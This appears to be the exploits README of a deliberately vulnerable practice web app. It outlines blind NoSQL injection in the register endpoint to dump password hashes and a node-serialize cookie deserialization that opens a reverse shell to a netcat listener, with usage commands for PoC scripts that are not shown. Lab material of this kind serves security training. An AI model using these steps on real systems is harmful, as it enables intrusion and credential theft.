# Exploits

## Blind NoSQL Injection (Auth Bypass)
The `username` parameter in `POST /register` is subject to blind NoSQL injection. We can leverage this to dump the SHA-256 password hashes of any user in the database.

- PoC: `dumpPasswordHash.py`
- Usage: `python3 dumpPasswordHash.py ip:3000 user`

The passwords used in this app are weak on purpose, any the hashes can be looked up using a site such as https://crackstation.net/

## Deserialization (RCE)
The draft feature uses a vulnerable node package (`node-serialize`), which is vulnerable to arbitrary code execution.

- PoC: `deserialize.py`
- Usage: 
  1. `python3 deserialize.py attackip attackerport` and copy the output
  2. Set up a netcat listener locally: `nc -nvlp attackerport`
  3. Create / edit the `draft` cookie, set the contents the the output we just copied (**Make sure there are no trailing whitespace characters**)
  4. Reload the home page / Log in
  5. The site will deserialize the cookie and set the message input box to the contents of `.msg`, subsequently running our reverse shell at the same time